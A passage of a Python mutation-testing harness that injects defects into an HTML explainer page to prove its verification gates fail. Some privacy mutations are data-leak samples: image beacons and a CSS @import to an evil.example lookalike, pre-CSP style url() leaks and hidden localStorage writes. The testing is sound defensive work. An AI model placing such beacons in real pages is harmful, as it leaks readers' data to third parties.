#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.13"
# dependencies = ["beautifulsoup4>=4.13"]
# ///
"""teachback — negative fixtures for the static gate, as executable mutations.

    TB="$(cc-plugin-root doc-tools)/skills/teachback"
    uv run --no-project --script "$TB/mutate_gate.py" <page.html>

Every mutation encodes one defect a reviewer of Eon-Labs/alpha-forge#527 showed the previous gate
could not see. A check that has never been observed to fail is not a check, so each mutation must
turn the gate RED.

The baseline is asserted clean FIRST. Without that step every "kill" is uninterpretable: a harness
that always reports non-zero looks identical to a harness that works. That failure has happened in
Eon-Labs/alpha-forge before — a run reported 18/18 killed where every kill was fabricated, because a
bad flag made every invocation exit non-zero.

A mutation that changes nothing, or that cannot find its target, is reported as BROKEN rather than
counted as a survivor. Two mutations here originally looked like blind gates and were in fact broken
mutations, selecting a fragment with a non-greedy regex instead of the element with a parser.
"""

from __future__ import annotations

import argparse
import ast
import json
import pathlib
import re
import subprocess
import sys
from collections.abc import Callable
from typing import NamedTuple

from bs4 import BeautifulSoup

GATE = pathlib.Path(__file__).with_name("verify_explainer.py")
RENDERED_GATE = pathlib.Path(__file__).with_name("verify_rendered.py")


class HarnessError(RuntimeError):
    """The harness itself is broken — distinct from a gate reporting a failure.

    Kept separate on purpose. Conflating "the gate said no" with "the gate never ran" is how a run
    reports kills it did not make.
    """


def run(work: pathlib.Path, gate: pathlib.Path | None = None, extra: list[str] | None = None) -> tuple[int, list[str]]:
    # check=False is deliberate and load-bearing: a NON-ZERO exit is the signal this harness is
    # looking for. Raising on it would abort the run at the first successful kill.
    target = gate or GATE
    # Invoke through `uv run --script` so the TARGET's own PEP 723 metadata is honoured. Running it
    # with sys.executable used this harness's environment instead, which declares only
    # beautifulsoup4 — so verify_rendered.py died on `import playwright` before printing anything.
    cmd = ["uv", "run", "--script", str(target), str(work), *(extra or [])]
    proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
    fails = [ln.strip() for ln in proc.stdout.splitlines() if "[FAIL]" in ln]

    # A CRASH IS NOT A CLEAN RUN. Counting only stdout "[FAIL]" lines meant a child that died before
    # printing scored ZERO failures — which the baseline assertion then accepted as clean, and which
    # made every subsequent mutation look like a survivor against a gate that never ran. The whole
    # point of asserting the baseline is to stop a non-zero exit being read as the outcome we wanted.
    if proc.returncode != 0 and not fails:
        raise HarnessError(
            f"{target.name} exited {proc.returncode} without reporting any check.\nstderr: {proc.stderr.strip()[:400]}"
        )
    return len(fails), fails


def swap_assessment(html: str, mutate) -> str:
    m = re.search(r'(<script type="application/json" id="assessment-data">)([\s\S]*?)(</script>)', html)
    assert m, "assessment block not found"
    data = json.loads(m.group(2))
    mutate(data)
    return html[: m.start(2)] + "\n" + json.dumps(data, ensure_ascii=False, indent=2) + "\n" + html[m.end(2) :]


def redistribute_correct(data: dict) -> None:
    """Move a correct answer from q2 to q1 — document-wide totals unchanged."""
    qs = data["questions"]
    for o in qs[1]["options"]:
        o["ok"] = False
    for o in qs[0]["options"]:
        if not o["ok"]:
            o["ok"] = True
            break


def add_malformed_option(data: dict) -> None:
    """Add a fifth option whose `ok` is neither True nor False.

    This satisfies "exactly one True and three False" while the question plainly has five choices,
    which is how an option-count contract slips through a truth-count check.
    """
    data["questions"][0]["options"].append({"t": "A fifth choice.", "ok": None, "fb": "Malformed."})


def share_distractor_prefix(data: dict) -> None:
    """Give two distractors feedback that agrees for 60 characters and diverges after.

    The static gate requires whole `fb` strings to be UNIQUE, but says nothing about their prefixes.
    So a 60-character-prefix comparison in the rendered gate could not tell these two apart, and a
    handler showing the wrong one passed. Paired with the handler mutation below, this is the exact
    scenario; alone it is legal content and must NOT trip the static gate.
    """
    opts = data["questions"][0]["options"]
    distractors = [o for o in opts if o.get("ok") is False]
    shared = "x" * 60
    # ALL of them, not two. An earlier version rewrote only two and left the third alone — so the
    # third's untouched feedback failed the OLD prefix check too, and the mutation was killed against
    # the pre-fix gate. It looked like evidence for the fix and was evidence for nothing.
    for n, option in enumerate(distractors):
        option["fb"] = f"{shared} tail number {n}, which differs only after the shared prefix."


def move_key_after_first_equation(html: str) -> str:
    """Put the notation key AFTER the first equation, and respell one of its attributes.

    The respelling is the point. The ordering check located each element by searching the source for
    the first 60 characters of bs4's re-serialisation, and bs4 normalises `class = "x"` to
    `class="x"`. A page written with that spacing scored -1 for "not found", and `-1 < pos_b` is True,
    so the check passed for ANY ordering. This mutation therefore has to be wrong in both ways at
    once — misplaced AND unfindable — to distinguish a real ordering check from the old one.
    """
    soup = BeautifulSoup(html, "html.parser")
    key = soup.select_one(".notationkey")
    first_eq = soup.select_one("div.eq")
    assert key is not None and first_eq is not None, "need both a notation key and an equation"
    key_src, eq_src = key.decode(), first_eq.decode()
    assert key_src in html and eq_src in html, "elements do not appear verbatim in the source"
    respelled = re.sub(r'class="([^"]*\bnotationkey\b[^"]*)"', r'class = "\1" data-moved', key_src, count=1)
    assert respelled != key_src, "could not respell the key's class attribute"
    out = html.replace(key_src, "", 1)
    return out.replace(eq_src, eq_src + "\n" + respelled, 1)


def _first_prose_paragraph(html: str) -> re.Match[str]:
    """The first <p> long enough to hold a sentence, so the edit lands in real prose."""
    for m in re.finditer(r"<p\b[^>]*>(.*?)</p>", html, re.S):
        if len(m.group(1)) > 200:
            return m
    raise AssertionError("no substantial paragraph found")


def break_one_paragraph(html: str) -> str:
    """Insert a newline inside ONE paragraph — the invariant this skill calls release-blocking.

    One paragraph, not all of them: the documented trap is that the naive whole-document regex fires
    on any page with two well-formed paragraphs, so a mutation that breaks everything cannot tell a
    working check from that one.
    """
    m = _first_prose_paragraph(html)
    body = m.group(1)
    cut = body.find(". ", 80)
    assert cut != -1, "paragraph has no sentence break to exploit"
    return html[: m.start(1)] + body[: cut + 1] + "\n" + body[cut + 2 :] + html[m.end(1) :]


def replace_in_first_paragraph(html: str, old: str, new: str) -> str:
    m = _first_prose_paragraph(html)
    body = m.group(1)
    assert old in body, f"{old!r} not present in the target paragraph"
    return html[: m.start(1)] + body.replace(old, new, 1) + html[m.end(1) :]


def strip_prose_encoding(html: str) -> str:
    """Remove the role colouring from prose only, leaving every equation block untouched.

    Tests that the encoding is required to extend BEYOND the equations. Removing it everywhere would
    also empty the equations, tripping a different check.
    """
    soup = BeautifulSoup(html, "html.parser")
    blocks = [d.decode() for d in soup.select("div.eq")]
    holes: list[str] = []
    out = html
    for i, block in enumerate(blocks):
        token = f"\x00EQ{i}\x00"
        assert block in out, "equation block does not appear verbatim in the source"
        out = out.replace(block, token, 1)
        holes.append(block)
    stripped = re.sub(r"\\class\{sym-[a-z]+\}", "", out)
    assert stripped != out, "no prose colouring to remove"
    for i, block in enumerate(holes):
        stripped = stripped.replace(f"\x00EQ{i}\x00", block, 1)
    return stripped


ROLES = ("sym-out", "sym-pos", "sym-ret", "sym-time", "sym-cost", "sym-disp")


def append_to_body(html: str, fragment: str) -> str:
    """Insert a fragment immediately before </body>.

    Overriding through an appended <style> rather than editing the page's own rules keeps these
    mutations independent of how the CSS happens to be written today — the mutation stays valid when
    the stylesheet is refactored, which a string replacement would not.
    """
    assert "</body>" in html, "page has no </body>"
    return html.replace("</body>", fragment + "\n</body>", 1)


def force_identical_palettes(html: str) -> str:
    """Give every role the same colour in both schemes — six distinct hues, none the body colour.

    Only the light-vs-dark comparison should fail: each role is still ONE colour, still distinct from
    its siblings, still not the body text colour. A mutation that tripped those too would not tell us
    whether the palette comparison works.
    """
    hues = ("#0a5f2a", "#1b4fa8", "#8a3ffc", "#a35c00", "#b3005e", "#00707a")
    rules = "".join(f".{r},mjx-container .{r}{{color:{h}!important}}" for r, h in zip(ROLES, hues))
    return append_to_body(html, f"<style>{rules}</style>")


def drop_one_same_role_symbol_chip(html: str) -> str:
    """Remove ONE chip where another chip of the SAME role survives in the same equation.

    This is the case a role-set comparison structurally cannot see. Both sides of the comparison stay
    equal — the role is still used and still chipped — while one coloured symbol loses its only
    explanation. Removing every chip of a role (the previous mutation) cannot expose it, because that
    changes the role set too.
    """
    soup = BeautifulSoup(html, "html.parser")
    for block in [d for d in soup.select("div.eq") if d.select_one("span.eqid") is not None]:
        by_role: dict[str, list] = {}
        for chip in block.select(".chips .chip"):
            if not attr_of(chip, "data-symbol"):
                continue
            for cls in chip.get("class") or []:
                if cls.startswith("sym-"):
                    by_role.setdefault(cls, []).append(chip)
        victim = next((chips[0] for chips in by_role.values() if len(chips) > 1), None)
        if victim is None:
            continue
        before = block.decode()
        assert before in html, "equation does not appear verbatim in the source"
        victim.decompose()
        return html.replace(before, block.decode(), 1)
    raise AssertionError("no equation has two declared chips sharing one role")


def attr_of(tag, name: str) -> str:
    value = tag.get(name, "")
    return " ".join(value) if isinstance(value, list) else str(value)


def empty_one_latex_panel(html: str) -> str:
    """Empty a <details> LaTeX panel while keeping its "LaTeX source" summary.

    The label survives, so a check reading the summary still sees the promise; nothing is recoverable.
    """
    soup = BeautifulSoup(html, "html.parser")
    for panel in soup.select("details"):
        if not any("LaTeX source" in s.get_text() for s in panel.select("summary")):
            continue
        before = panel.decode()
        assert before in html, "panel does not appear verbatim in the source"
        summary = panel.select_one("summary")
        assert summary is not None
        panel.clear()
        panel.append(summary)
        return html.replace(before, panel.decode(), 1)
    raise AssertionError("no LaTeX source panel found")


def drop_one_role_css(html: str) -> str:
    """Delete one role's CSS custom-property declarations, leaving the role named in prose.

    The role is still used by the maths and still explained in the notation key; only the rule that
    gives it a colour is gone. A check that merely greps the document for ".sym-foo" cannot tell.
    """
    soup = BeautifulSoup(html, "html.parser")
    roles = sorted({m.group(1) for m in re.finditer(r"\\class\{(sym-[a-z]+)\}", html)})
    assert roles, "no roles in use"
    victim = roles[0]
    out = html
    for style in soup.find_all("style"):
        text = style.get_text()
        # ONLY the selector's rule. An earlier version also deleted the `--sym-x:` custom properties,
        # which tripped the dark-scheme check instead — reported MISDIRECTED, correctly: it would have
        # scored a kill for a check it never exercised.
        stripped = re.sub(rf"[^{{}}]*\.{re.escape(victim)}\b[^{{}}]*\{{[^}}]*\}}", "", text)
        if stripped != text:
            out = out.replace(text, stripped, 1)
    assert out != html, f"no CSS found for {victim}"
    return out + f"\n<!-- the .{victim} role is described here in prose only -->\n"


def blank_last_equation_children(html: str, selector: str) -> str:
    """Empty the TEXT of matching elements in the last numbered equation, leaving the skeleton.

    The elements still exist and still match their selectors, so any check asking only "is it
    present?" still passes. This is the shape of every bypass in this family: the right markup,
    saying nothing.
    """
    soup = BeautifulSoup(html, "html.parser")
    numbered = [d for d in soup.select("div.eq") if d.select_one("span.eqid") is not None]
    assert numbered, "no numbered equation blocks"
    target = numbered[-1]
    before = target.decode()
    victims = target.select(selector)
    assert victims, f"last equation has no {selector} to empty"
    for v in victims:
        v.clear()
    assert before in html, "could not locate the target block verbatim in the source"
    return html.replace(before, target.decode(), 1)


def drop_one_chip(html: str, *, last_equation: bool) -> str:
    """Remove exactly ONE role-bearing chip, leaving the rest in place.

    Partial removal is what distinguishes a COVERAGE check from a COUNT check. Blanking every chip
    trips any threshold; removing one leaves the count comfortably above it while a documented role
    silently disappears.
    """
    soup = BeautifulSoup(html, "html.parser")
    if last_equation:
        blocks = [d for d in soup.select("div.eq") if d.select_one("span.eqid") is not None]
        assert blocks, "no numbered equation blocks"
        container = blocks[-1]
    else:
        container = soup.select_one(".notationkey")
        assert container is not None, "no notation key"
    before = container.decode()
    chips = [c for c in container.select(".chip") if any(k.startswith("sym-") for k in (c.get("class") or []))]
    assert len(chips) >= 2, f"need 2+ role-bearing chips to remove one, found {len(chips)}"
    # Remove every chip carrying the chosen ROLE, not a single chip. Equation (8) documents sym-disp
    # twice, so dropping one left the role covered and the mutation was a no-op — killed only by the
    # revision-id check, which is exactly the "killed for the wrong reason" trap.
    victim_role = next(k for k in (chips[0].get("class") or []) if k.startswith("sym-"))
    removed = 0
    for c in list(chips):
        if victim_role in (c.get("class") or []):
            c.decompose()
            removed += 1
    assert removed, f"removed no chip for {victim_role}"
    assert before in html, "could not locate the container verbatim in the source"
    return html.replace(before, container.decode(), 1)


def duplicate_id(data: dict) -> None:
    data["questions"][1]["id"] = data["questions"][0]["id"]


def strip_last_equation_aid(html: str, cls: str) -> str:
    """Remove one annotation from the LAST numbered equation only.

    The last one specifically: the old chip check tolerated `>= n - 1`, so a page missing chips on
    exactly one equation passed, and the final equation is where a generator is most likely to stop.

    Parsed with bs4 rather than matched: `<div class="eq">[\\s\\S]*?\\n</div>` is non-greedy and the
    blocks contain nested divs, so it closed at the first inner </div> and selected a fragment that
    never held the annotation being removed — which the harness then reported as a blind gate. The
    same confusion between "matched some text" and "selected the element" that this gate exists to
    stop.
    """
    soup = BeautifulSoup(html, "html.parser")
    numbered = [d for d in soup.select("div.eq") if d.select_one("span.eqid") is not None]
    assert numbered, "no numbered equation blocks"
    target = numbered[-1]
    before = target.decode()
    victim = target.select_one(f".{cls}")
    assert victim is not None, f"last equation has no .{cls} to remove"
    victim.decompose()
    assert before in html, "could not locate the target block verbatim in the source"
    return html.replace(before, target.decode(), 1)


# ---------------------------------------------------------------------------------------
# Coverage close-out. Each of these targets a check that had NO mutation at all — the set the
# --audit-coverage flag exists to surface. Six of the first seven such checks probed turned out
# to be defective, so the remainder were worth writing rather than assuming sound.
# ---------------------------------------------------------------------------------------


def remove_annotation_toggle(html: str) -> str:
    """Remove the #annotToggle element, breaking the toggle-present check."""
    pattern = r'<button[^>]*id="annotToggle"[^>]*>.*?</button>'
    mutated = re.sub(pattern, "", html, count=1)
    assert mutated != html, "could not remove annotToggle button"
    return mutated


def remove_aria_pressed(html: str) -> str:
    """Remove aria-pressed attribute from the toggle, breaking the pressed-state check."""
    pattern = r'(<button[^>]*id="annotToggle"[^>]*)\s+aria-pressed="[^"]*"'
    mutated = re.sub(pattern, r"\1", html, count=1)
    assert mutated != html, "could not remove aria-pressed attribute"
    return mutated


def remove_assessment_script(html: str) -> str:
    """Remove the assessment-data script tag, breaking the parseable-block check."""
    assert '<script type="application/json" id="assessment-data"' in html, "assessment-data script not found"
    pattern = r'<script type="application/json" id="assessment-data">[\s\S]*?</script>'
    mutated = re.sub(pattern, "<!-- assessment removed -->", html, count=1)
    assert mutated != html, "could not remove assessment script"
    return mutated


def corrupt_assessment_json(html: str) -> str:
    """Corrupt the JSON in the assessment block so it fails to parse."""
    m = re.search(r'(<script type="application/json" id="assessment-data">)([\s\S]*?)(</script>)', html)
    assert m, "assessment block not found"
    raw = m.group(2)
    mutated_data = raw.replace('"questions"', '"questionsX', 1)
    assert mutated_data != raw, "could not corrupt JSON"
    return html[: m.start(2)] + mutated_data + html[m.end(2) :]


def make_assessment_empty_string(html: str) -> str:
    """Make the assessment JSON be an empty string to trigger exception path."""
    m = re.search(r'(<script type="application/json" id="assessment-data">)([\s\S]*?)(</script>)', html)
    assert m, "assessment block not found"
    return html[: m.start(2)] + "   " + html[m.end(2) :]


def exceed_question_count(html: str) -> str:
    """Add extra questions to exceed the 8-question limit."""
    m = re.search(r'(<script type="application/json" id="assessment-data">)([\s\S]*?)(</script>)', html)
    assert m, "assessment block not found"
    data = json.loads(m.group(2))
    while len(data.get("questions", [])) < 9:
        new_q = {
            "id": f"q_extra_{len(data['questions'])}",
            "objective": "Extra question",
            "options": [
                {"t": "Option A", "ok": True, "fb": "Correct feedback."},
                {"t": "Option B", "ok": False, "fb": "Incorrect feedback 1."},
                {"t": "Option C", "ok": False, "fb": "Incorrect feedback 2."},
                {"t": "Option D", "ok": False, "fb": "Incorrect feedback 3."},
            ],
        }
        data["questions"].append(new_q)
    return html[: m.start(2)] + "\n" + json.dumps(data, ensure_ascii=False, indent=2) + "\n" + html[m.end(2) :]


def _change_latest_revision_id(html: str) -> str:
    """Find the last data-revision-id and change it to an invalid hash.

    The check verifies: `declared[-1] == computed` where computed is a hash of <main>.
    We change it to "000000000000" which will never match.
    """
    # Find all data-revision-id attributes (12 hex characters)
    matches = list(re.finditer(r'data-revision-id="[a-f0-9]{12}"', html))
    if not matches:
        raise AssertionError("no data-revision-id found in the page")

    # Replace the last one
    last_match = matches[-1]
    return html[: last_match.start()] + 'data-revision-id="000000000000"' + html[last_match.end() :]


def change_mathjax_version_format(html: str) -> str:
    """Change the version-pinned URL to an unpinned one.

    The check looks for `mathjax@X.Y.Z`; changing it to `mathjax@latest` breaks the regex while
    keeping the script element present.
    """
    old = "https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"
    new = "https://cdn.jsdelivr.net/npm/mathjax@latest/es5/tex-mml-chtml.js"
    assert old in html, "expected MathJax CDN URL not found"
    return html.replace(old, new, 1)


def add_equation_image(html: str) -> str:
    """Add an equation image to the page.

    The check forbids img tags with src containing 'eq', 'math', or 'formula'. Adding one with
    'eq' in the src should trigger a failure.
    """
    assert "<main" in html, "no main element found"
    img_tag = '<img src="/images/eq-preview.png" alt="equation preview" />'
    main_start = html.find("<main")
    main_close = html.find(">", main_start)
    return html[: main_close + 1] + "\n" + img_tag + html[main_close + 1 :]


def remove_html_package_enabled(html: str) -> str:
    """Remove the html package from the loader packages list.

    The check uses: r"packages:\\s*\\{\\s*'\\[\\+\\]':\\s*\\[[^\\]]*'html'"
    We replace 'html' with something else to break the match.
    """
    pattern = r"'html'"
    result = re.sub(pattern, "'dummy'", html, count=1)
    assert result != html, "could not find 'html' package entry"
    return result


def reduce_role_vocabulary(html: str) -> str:
    """Reduce the number of roles to fewer than 3.

    The check requires 3 <= len(roles) <= 8. We'll replace all roles with a single role
    to drop below 3. Uses string replacement instead of regex to avoid escaping issues.
    """
    roles_in_use = sorted({m.group(1) for m in re.finditer(r"\\class\{(sym-[a-z]+)\}", html)})
    if len(roles_in_use) <= 2:
        raise AssertionError(f"page already has {len(roles_in_use)} roles; cannot reduce further")

    keep_role = roles_in_use[0]
    remove_roles = roles_in_use[1:]

    out = html
    for role in remove_roles:
        old_pattern = f"\\class{{{role}}}"
        new_pattern = f"\\class{{{keep_role}}}"
        out = out.replace(old_pattern, new_pattern)

    assert out != html, "no roles were changed"
    return out


def remove_dark_scheme_values(html: str) -> str:
    """Remove the dark-scheme CSS variable declarations for one role.

    The check looks for entries like `--sym-out:` inside @media (prefers-color-scheme: dark) blocks.
    We'll remove all custom property declarations for the first role in the dark scheme.
    """
    roles_in_use = sorted({m.group(1) for m in re.finditer(r"\\class\{(sym-[a-z]+)\}", html)})
    assert roles_in_use, "no roles found in page"

    victim_role = roles_in_use[0]
    pattern = rf"--{re.escape(victim_role)}:\s*[^;]*;"
    result = re.sub(pattern, "", html)
    assert result != html, f"no dark-scheme declarations found for {victim_role}"
    return result


def duplicate_feedback_strings(data: dict) -> None:
    """Make two feedback strings identical.

    The uniqueness check compares feedback texts via set membership. Make the first
    distractor of q1 and the first distractor of q2 have identical feedback.
    """
    qs = data["questions"]
    shared_fb = "This is a shared feedback string for testing purposes."
    qs[0]["options"][1]["fb"] = shared_fb
    qs[1]["options"][1]["fb"] = shared_fb


def strip_aria_live(html: str) -> str:
    """Remove the live region's `aria-live` in BOTH spellings the page uses.

    The check is a conjunction — the summary element must exist AND "aria-live" must appear — so a
    mutation that rewrites only the HTML attribute leaves the JS object key behind and the check
    still passes. Both have to go for the mutation to be about the contract rather than the markup.
    """
    out = re.sub(r'aria-live="([^"]*)"', r'role="\1"', html)
    out = out.replace('"aria-live":', '"role":')
    assert "aria-live" not in out, "aria-live survives in a spelling this mutation does not know"
    assert out != html, "no aria-live to remove"
    return out


def make_shell_a_grid_with_unplaced_children(html: str) -> str:
    """Turn `.shell` INTO a grid and leave its children to auto-flow.

    The first version of this mutation set `grid-column:auto` on a child while `.shell` was still
    `display:block`, and it survived — correctly. SKILL.md says "do not make .shell a grid"; the
    check is a conditional guard, so passing while the condition is absent is the contract, not a
    blind spot. The mutation was the defective thing, not the gate.

    Creating the condition is what tests the guard, and doing so exposed the real defect: the
    predicate threw a TypeError instead of naming the unplaced children.
    """
    return append_to_body(html, "<style>.shell{display:grid!important;grid-template-columns:240px 1fr}</style>")


def strand_one_declared_option(html: str) -> str:
    """Declare four options in the JSON but render only three for the first question.

    The first attempt appended a FIFTH option to the JSON and survived — correctly. The page builds
    its inputs FROM that JSON (measured: 5 options produced 5 inputs), so the extra option was
    genuinely reachable and the check was right to pass. The mutation was the defective thing.

    A real mismatch needs the DOM to lose an option the data still declares, which is what this does
    after the page has rendered.
    """
    script = (
        "<script>addEventListener('load',function(){setTimeout(function(){"
        "var q=document.querySelector('.q');if(!q)return;"
        "var i=q.querySelectorAll(\"input[type='radio']\");if(i.length<2)return;"
        "var last=i[i.length-1];(last.closest('label')||last).remove();"
        "},80);});</script>"
    )
    return append_to_body(html, script)


def rename_assessment_data_id(html: str) -> str:
    """Make the assessment block unfindable while leaving valid JSON in the document.

    Corrupting the JSON instead made the PAGE's own script throw, so the run went red on console
    errors and on the annotation toggle while the check under test stayed silent — MISDIRECTED. The
    branch being targeted is `if not plan`, reached when `getElementById('assessment-data')` returns
    null, so renaming the id reaches it without collateral damage.
    """
    old = 'id="assessment-data"'
    assert old in html, "assessment data block not found"
    return html.replace(old, 'id="assessment-data-renamed"', 1)


def force_unplaced_grid_child(html: str) -> str:
    """Make one grid child unplaced by removing its explicit grid-column.

    Targets: verify_rendered.py:256 "every grid child has an explicit grid-column"

    The check evaluates gridColumnStart and gridArea to detect unplaced children.
    We add CSS that forces the second child of .shell to have auto grid placement.
    """
    return append_to_body(html, "<style>.shell>:nth-child(2) { grid-column: auto !important; }</style>")


def break_color_toggle(html: str) -> str:
    """Make the math notation colours disappear when the toggle is clicked.

    Targets: verify_rendered.py:307 "colour survives the toggle"

    The check clicks #annotToggle and expects mjx-container[class*="sym-"] elements
    to still have distinct colours. We hide them when the toggle adds the no-annot class.
    """
    return append_to_body(
        html,
        '<style>body.no-annot mjx-container [class*="sym-"]{display:none!important}</style>',
    )


def hide_annotation_toggle(html: str) -> str:
    """Remove the annotation toggle button.

    Targets: verify_rendered.py:322 "annotation toggle present"

    The check looks for #annotToggle and fails if not found. We remove it entirely.
    """
    soup = BeautifulSoup(html, "html.parser")
    toggle = soup.select_one("#annotToggle")
    assert toggle is not None, "no #annotToggle found"
    toggle.decompose()
    return str(soup)


def disable_all_options_after_solve(html: str) -> str:
    """Disable all options after solving a question.

    Targets: verify_rendered.py:390 "after solving, no option is disabled in ANY of {} questions"

    The check solves a question and verifies that no option becomes disabled.
    We add code that disables all inputs once solved.
    """
    return html.replace(
        "    if (s.solved) {",
        "    if (s.solved) { document.querySelectorAll('input').forEach(inp => inp.disabled = true); ",
        1,
    )


def make_options_unreachable(html: str) -> str:
    """Add options to the assessment that cannot be clicked.

    Targets: verify_rendered.py:400 "every question's options were reachable"

    The check tries to click each option by index. If there are more options in the JSON
    than input elements in the DOM, some are unreachable. We add a 5th option to the JSON.
    """
    m = re.search(r'(<script type="application/json" id="assessment-data">)([\s\S]*?)(</script>)', html)
    assert m, "assessment block not found"
    data = json.loads(m.group(2))
    data["questions"][0]["options"].append(
        {"t": "Fifth option (unreachable)", "ok": False, "fb": "No input element for this option."}
    )
    return html[: m.start(2)] + "\n" + json.dumps(data, ensure_ascii=False, indent=2) + "\n" + html[m.end(2) :]


def break_annotation_persistence(html: str) -> str:
    """Make the annotation choice NOT survive a reload.

    Targets: verify_rendered.py:474 "the annotation choice survives a reload in both directions"

    The check toggles annotation state, reloads, and checks if the preference persisted.
    We make the localStorage write ignore the user's choice by always storing "on".
    """
    return html.replace(
        'localStorage.setItem(ANNOT_KEY, on ? "on" : "off");',
        'localStorage.setItem(ANNOT_KEY, "on");  // Ignore user preference',
        1,
    )


Mutation = tuple[str, str, Callable[[str], str]]
"""(label, expects, mutate) — `expects` names the check this mutation must trip.

A kill is only evidence for the check it was written to exercise. Round eight of review produced a
mutation reported KILLED whose single failure was the REVISION-ID check: the mutation was a no-op for
its own target (the role it removed was documented twice, so coverage survived) and the id mismatch
alone turned the gate red. From the outside that is indistinguishable from a working mutation.

So every mutation names a distinctive fragment of its target check's description, and a kill that
does not include that fragment is reported MISDIRECTED and counted as a failure — the check it
claimed to prove is still unproven.
"""

MUTATIONS: list[Mutation] = [
    (
        "assessment: move a correct answer between questions (totals preserved)",
        "exactly four options",
        lambda h: swap_assessment(h, redistribute_correct),
    ),
    ("assessment: duplicate a question id", "duplicate question ids", lambda h: swap_assessment(h, duplicate_id)),
    (
        "notation: remove the reading from the LAST equation only",
        "carries reading",
        lambda h: strip_last_equation_aid(h, "reads"),
    ),
    (
        "notation: remove the chips from the LAST equation only",
        "carries reading",
        lambda h: strip_last_equation_aid(h, "chips"),
    ),
    (
        "notation: remove the worked numbers from the LAST equation only",
        "carries reading",
        lambda h: strip_last_equation_aid(h, "numbers"),
    ),
    (
        "privacy: delete the Content Security Policy",
        "Content Security Policy is declared",
        lambda h: h.replace('<meta http-equiv="Content-Security-Policy"', '<meta name="was-csp"', 1),
    ),
    (
        "privacy: allow a second origin in the CSP",
        "at most one remote origin",
        lambda h: h.replace(
            "script-src 'unsafe-inline' https://cdn.jsdelivr.net",
            "script-src 'unsafe-inline' https://cdn.jsdelivr.net https://evil.example",
            1,
        ),
    ),
    (
        "privacy: add an image beacon to a third-party origin",
        "exact pinned MathJax script",
        lambda h: h.replace("</main>", '<img src="https://evil.example/b?leak=1" alt=""></main>', 1),
    ),
    (
        "privacy: persist reader answers under teachback:responses",
        "localStorage stores only",
        lambda h: h.replace(
            'var ANNOT_KEY = "teachback:annotations";',
            'var ANNOT_KEY = "teachback:annotations";\n  localStorage.setItem("teachback:responses", "x");',
            1,
        ),
    ),
    (
        "mathjax: revert to a machine-specific file:// source",
        "machine-specific file",
        lambda h: h.replace(
            'src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"',
            'src="file:///Users/someone/node_modules/mathjax/es5/tex-mml-chtml.js"',
            1,
        ),
    ),
    (
        "mathjax: drop the subresource-integrity hash",
        "integrity hash on every remote script",
        lambda h: re.sub(r'\n\s*integrity="sha384-[^"]+"', "", h, count=1),
    ),
    (
        "mathjax: leave only a comment claiming the loader exists",
        "real <script> element loads MathJax",
        lambda h: re.sub(
            r"<script id=\"mj\" async[\s\S]*?</script>", "<!-- loads mathjax@3.2.2 tex-mml-chtml.js -->", h, count=1
        ),
    ),
    # A CSP governs only what FOLLOWS it. A beacon on the ALLOWED origin, placed above a late policy,
    # is requested before the policy applies and can encode page content in its query string — and
    # the rendered gate treats that origin as trusted, so neither gate would have seen it.
    (
        "privacy: move the CSP below a beacon on the ALLOWED origin",
        "first tag after",
        lambda h: h.replace(
            '<meta http-equiv="Content-Security-Policy"',
            '<img src="https://cdn.jsdelivr.net/npm/x.png?leak=private-context" alt="">\n<meta http-equiv="Content-Security-Policy"',
            1,
        ),
    ),
    (
        "privacy: reference a different URL on the allowed origin",
        "exact pinned MathJax script",
        lambda h: h.replace("</main>", '<img src="https://cdn.jsdelivr.net/npm/leak?d=1" alt=""></main>', 1),
    ),
    (
        "privacy: corrupt the integrity hash",
        "expected integrity hash",
        lambda h: h.replace('integrity="sha384-Wuix', 'integrity="sha384-XXXX', 1),
    ),
    # Ordinary JavaScript the dot-notation scanner cannot see.
    (
        "privacy: persist state via localStorage bracket notation",
        "permitted call form",
        lambda h: h.replace(
            'var ANNOT_KEY = "teachback:annotations";',
            'var ANNOT_KEY = "teachback:annotations";\n  localStorage["setItem"]("teachback:responses", "x");',
            1,
        ),
    ),
    (
        "assessment: add a fifth option whose ok is non-boolean",
        "exactly four options",
        lambda h: swap_assessment(h, add_malformed_option),
    ),
    (
        "assessment: lock options out via setAttribute",
        "option-disabling code",
        lambda h: h.replace(
            "function choose(", 'function lockOut(el){ el.setAttribute("disabled", ""); }\n  function choose(', 1
        ),
    ),
    # CSS is a request surface no element's src/href/action mentions, and the hostname below starts
    # with the allowed origin as a STRING while belonging to someone else entirely.
    (
        "privacy: @import from a prefix-domain lookalike, above the CSP",
        "first tag after",
        lambda h: h.replace(
            '<meta http-equiv="Content-Security-Policy"',
            '<style>@import url("https://cdn.jsdelivr.net.evil.example/leak.css?private=context");</style>\n'
            '<meta http-equiv="Content-Security-Policy"',
            1,
        ),
    ),
    (
        "privacy: reach storage through a computed global property",
        "computed global access",
        lambda h: h.replace(
            'var ANNOT_KEY = "teachback:annotations";',
            'var ANNOT_KEY = "teachback:annotations";\n'
            '  globalThis["local" + "Storage"].setItem("teachback:responses", "x");',
            1,
        ),
    ),
    # A style="" attribute on an ordinary element is a request surface no element-name list contains,
    # and this URL is on the genuinely-allowed origin — so only the CSP's POSITION can stop it.
    (
        "privacy: style-attribute url() on the allowed origin, above the CSP",
        "first tag after",
        lambda h: h.replace(
            '<meta http-equiv="Content-Security-Policy"',
            '<div style="background:url(https://cdn.jsdelivr.net/npm/leak?private=context)"></div>\n'
            '<meta http-equiv="Content-Security-Policy"',
            1,
        ),
    ),
    # PRESENCE IS NOT CONTENT. The skeleton is intact; the annotations say nothing.
    (
        "notation: empty every chip in the LAST equation",
        "carries reading",
        lambda h: blank_last_equation_children(h, ".chips .chip"),
    ),
    (
        "notation: empty the reading of the LAST equation",
        "carries reading",
        lambda h: blank_last_equation_children(h, ".reads"),
    ),
    # PARTIAL removal. The blank-everything mutations above cannot expose a COUNT-based check: one
    # surviving chip satisfies "at least one", and three surviving key chips satisfied ">= 3", while
    # the roles they fail to document go unnoticed. Remove exactly one and the gap appears.
    (
        "notation: remove ONE role's chip from the LAST equation",
        "carries reading",
        lambda h: drop_one_chip(h, last_equation=True),
    ),
    (
        "notation: remove ONE role's chip from the notation key",
        "documents EVERY role",
        lambda h: drop_one_chip(h, last_equation=False),
    ),
    (
        "notation: empty the notation key",
        "documents EVERY role",
        lambda h: re.sub(
